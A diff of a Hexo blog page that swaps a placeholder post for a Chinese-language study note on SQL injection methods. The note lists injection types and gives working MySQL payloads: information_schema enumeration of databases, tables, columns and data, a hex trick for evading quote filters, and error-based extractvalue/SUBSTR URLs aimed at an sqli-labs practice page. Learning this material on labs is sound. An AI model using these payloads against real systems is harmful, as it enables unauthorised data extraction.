@@ -21,19 +21,21 @@
     var CONFIG = {"hostname":"yzyyizhiyu.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="hexo">
+  <meta name="description" content="SQL注入方法 UNION query SQL injection 		(可联合查询注入)   Error-based SQL injection		(报错型注入)   Boolean-based blind SQL injection(布尔型注入)   Time-based blind SQLinjection	 (基于时间延迟注入)   Wide char SQL injection 		 (">
 <meta property="og:type" content="article">
-<meta property="og:title" content="我的第一篇博客">
-<meta property="og:url" content="http://yzyyizhiyu.github.io/2023/03/27/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/index.html">
+<meta property="og:title" content="SQL注入方法">
+<meta property="og:url" content="http://yzyyizhiyu.github.io/2023/04/02/SQL%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95/index.html">
 <meta property="og:site_name" content="YZYBlog">
-<meta property="og:description" content="hexo">
+<meta property="og:description" content="SQL注入方法 UNION query SQL injection 		(可联合查询注入)   Error-based SQL injection		(报错型注入)   Boolean-based blind SQL injection(布尔型注入)   Time-based blind SQLinjection	 (基于时间延迟注入)   Wide char SQL injection 		 (">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-03-27T07:16:58.000Z">
-<meta property="article:modified_time" content="2023-03-27T07:19:37.447Z">
+<meta property="og:image" content="http://yzyyizhiyu.github.io/img/image-20230330191207849.png">
+<meta property="article:published_time" content="2023-04-01T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-04-02T12:35:57.130Z">
 <meta property="article:author" content="Henry">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yzyyizhiyu.github.io/img/image-20230330191207849.png">
 
-<link rel="canonical" href="http://yzyyizhiyu.github.io/2023/03/27/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/">
+<link rel="canonical" href="http://yzyyizhiyu.github.io/2023/04/02/SQL%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95/">
 
 
 <script id="page-configurations">
@@ -46,7 +48,7 @@
   };
 </script>
 
-  <title>我的第一篇博客 | YZYBlog</title>
+  <title>SQL注入方法 | YZYBlog</title>
   
 
 
@@ -81,7 +83,7 @@
 
 <body itemscope itemtype="http://schema.org/WebPage">
   <div class="container use-motion">
-    <div class="headband"></div>
+    <!--<div class="headband"></div>-->
 
     <header class="header" itemscope itemtype="http://schema.org/WPHeader">
       <div class="header-inner"><div class="site-brand-container">
@@ -177,6 +179,7 @@
     </header>
 
     
+  <div class="reading-progress-bar"></div>
 
 
     <main class="main">
@@ -191,10 +194,10 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yzyyizhiyu.github.io/2023/03/27/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/">
+    <link itemprop="mainEntityOfPage" href="http://yzyyizhiyu.github.io/2023/04/02/SQL%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/touxiang.jpg">
       <meta itemprop="name" content="Henry">
       <meta itemprop="description" content="keep clam">
     </span>
@@ -204,7 +207,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          我的第一篇博客
+          SQL注入方法
         </h1>
 
         <div class="post-meta">
@@ -215,7 +218,16 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2023-03-27 15:16:58 / 修改时间：15:19:37" itemprop="dateCreated datePublished" datetime="2023-03-27T15:16:58+08:00">2023-03-27</time>
+              <time title="创建时间：2023-04-02 00:00:00 / 修改时间：20:35:57" itemprop="dateCreated datePublished" datetime="2023-04-02T00:00:00+08:00">2023-04-02</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
+                </span>
             </span>
 
           <br>
@@ -224,14 +236,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>4</span>
+              <span>1.8k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
+              <span>2 分钟</span>
             </span>
 
         </div>
@@ -243,13 +255,58 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>hexo</p>
+        <h2 id="SQL注入方法"><a href="#SQL注入方法" class="headerlink" title="SQL注入方法"></a>SQL注入方法</h2><ul>
+<li><p>UNION query SQL injection 		(可联合查询注入) </p>
+</li>
+<li><p>Error-based SQL injection		(报错型注入) </p>
+</li>
+<li><p>Boolean-based blind SQL injection(布尔型注入) </p>
+</li>
+<li><p>Time-based blind SQLinjection	 (基于时间延迟注入) </p>
+</li>
+<li><p>Wide char SQL injection 		 (宽字节注入) </p>
+</li>
+<li><p>Twice SQL injection 			 (二次注入) </p>
+</li>
+<li><p>Stacked queries SQL injection	 (可多语句查询注入) 堆叠注入</p>
+</li>
+</ul>
+<p>堆叠注入用于5.0以下版本的MySQL,sql语句;sql语句;sql语句;,直接在后面拼接 </p>
+<ul>
+<li>Access数据库 &#x3D;&gt;偏移注入<span id="more"></span></li>
+</ul>
+<h2 id="sql注入常用语句-playload"><a href="#sql注入常用语句-playload" class="headerlink" title="sql注入常用语句(playload)"></a>sql注入常用语句(playload)</h2><h3 id="1-列出数据库"><a href="#1-列出数据库" class="headerlink" title="1.列出数据库"></a>1.列出数据库</h3><p> limit 一个一个打印出来库名(用于查询条数受限)<br>  select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1</p>
+<p> group_concat 一次性全部显示<br>  select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</p>
+<h3 id="2-列出某数据库中所有的表"><a href="#2-列出某数据库中所有的表" class="headerlink" title="2.列出某数据库中所有的表"></a>2.列出某数据库中所有的表</h3><p> limit 一个一个打印出来字段名<br>  select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA&#x3D;’数据库名称’ limit 0,1</p>
+<p> group_concat 一次性全部显示<br>  select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA&#x3D;’数据库名称’</p>
+<h3 id="3-列出某数据库中某表中所有的字段"><a href="#3-列出某数据库中某表中所有的字段" class="headerlink" title="3.列出某数据库中某表中所有的字段"></a>3.列出某数据库中某表中所有的字段</h3><p>​	limit 一个一个打印出来<br>​		select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA&#x3D;’数据库名’ and TABLE_NAME&#x3D;’数据库中的任意表’ limit 0,1<br>​	group_concat 一次性全部显示<br>​		select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA&#x3D;’数据库名’ and TABLE_NAME&#x3D;’数据库中的任意表’<br>数据库名称同时可以使用<strong>16进制</strong>(<strong>不要用引号</strong>)来代替,绕过单引号限制,<strong>0x</strong>开头<br>例:库	security&#x3D;0x7365637572697479</p>
+<h3 id="4-列出数据库中的表中的字段中的数据"><a href="#4-列出数据库中的表中的字段中的数据" class="headerlink" title="4.列出数据库中的表中的字段中的数据"></a>4.列出数据库中的表中的字段中的<strong>数据</strong></h3><p> limit 一个一个打印出来<br>  select 字段,字段 from 数据库.表 limit 0,1</p>
+<p> group_concat 把 一次性全部打印<br>(数据库.表可快速定位哪个数据库的那个表)<br>0x20为ASCII码的空格<br>0x2D为ASCII码的减号<br>select group_concat(concat(字段,0x2D,字段)) from security.users(数据库.表)</p>
+<h2 id="显示位受限时"><a href="#显示位受限时" class="headerlink" title="显示位受限时"></a>显示位受限时</h2><p><img src="/../img/image-20230330191207849.png"> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.如果显示位受限时除了能用limit一个一个列出来</span><br><span class="line">http://www.sqli.com/Less-2/?id=1  and extractvalue(1, concat(0x7e,(select SCHEMA_NAME from information_schema.SCHEMATA limit 2,1),0x7e)) --+</span><br><span class="line"></span><br><span class="line">2.还能用substr(),substring(),left()函数</span><br><span class="line">and extractvalue(1, concat(0x7e,SUBSTR((playload),从第几位开始,读取长度),0x7e))</span><br><span class="line"></span><br><span class="line">http://www.sqli.com/Less-2/?id=1  and extractvalue(1, concat(0x7e,SUBSTR((select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA),1,10),0x7e)) --+</span><br><span class="line">http://www.sqli.com/Less-2/?id=1  and extractvalue(1, concat(0x7e,SUBSTR((select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA),11,10),0x7e)) --+</span><br><span class="line">直到读完为止</span><br></pre></td></tr></table></figure>
 
     </div>
 
     
     
     
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Henry
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yzyyizhiyu.github.io/2023/04/02/SQL%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95/" title="SQL注入方法">http://yzyyizhiyu.github.io/2023/04/02/SQL注入方法/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
 
       <footer class="post-footer">
 
@@ -260,8 +317,8 @@
     <div class="post-nav">
       <div class="post-nav-item"></div>
       <div class="post-nav-item">
-    <a href="/2023/03/27/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2%20-%20%E5%89%AF%E6%9C%AC/" rel="next" title="我的第一篇博客">
-      我的第一篇博客 <i class="fa fa-chevron-right"></i>
+    <a href="/2023/04/02/SQL%E5%9F%BA%E7%A1%80/" rel="next" title="SQL基础">
+      SQL基础 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -321,11 +378,14 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95"><span class="nav-number">1.</span> <span class="nav-text">SQL注入方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5-playload"><span class="nav-number">2.</span> <span class="nav-text">sql注入常用语句(playload)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%88%97%E5%87%BA%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">2.1.</span> <span class="nav-text">1.列出数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%88%97%E5%87%BA%E6%9F%90%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%89%80%E6%9C%89%E7%9A%84%E8%A1%A8"><span class="nav-number">2.2.</span> <span class="nav-text">2.列出某数据库中所有的表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%88%97%E5%87%BA%E6%9F%90%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%9F%90%E8%A1%A8%E4%B8%AD%E6%89%80%E6%9C%89%E7%9A%84%E5%AD%97%E6%AE%B5"><span class="nav-number">2.3.</span> <span class="nav-text">3.列出某数据库中某表中所有的字段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E5%88%97%E5%87%BA%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%AD%97%E6%AE%B5%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="nav-number">2.4.</span> <span class="nav-text">4.列出数据库中的表中的字段中的数据</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%98%BE%E7%A4%BA%E4%BD%8D%E5%8F%97%E9%99%90%E6%97%B6"><span class="nav-number">3.</span> <span class="nav-text">显示位受限时</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Henry"
+      src="/images/touxiang.jpg">
   <p class="site-author-name" itemprop="name">Henry</p>
   <div class="site-description" itemprop="description">keep clam</div>
 </div>
@@ -334,12 +394,23 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-count">2</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
   </nav>
 </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/YZYyizhiyu" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;YZYyizhiyu" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
 
 
 
@@ -375,12 +446,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">0k</span>
+    <span title="站点总字数">4k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">1 分钟</span>
+    <span title="站点阅读时长">3 分钟</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
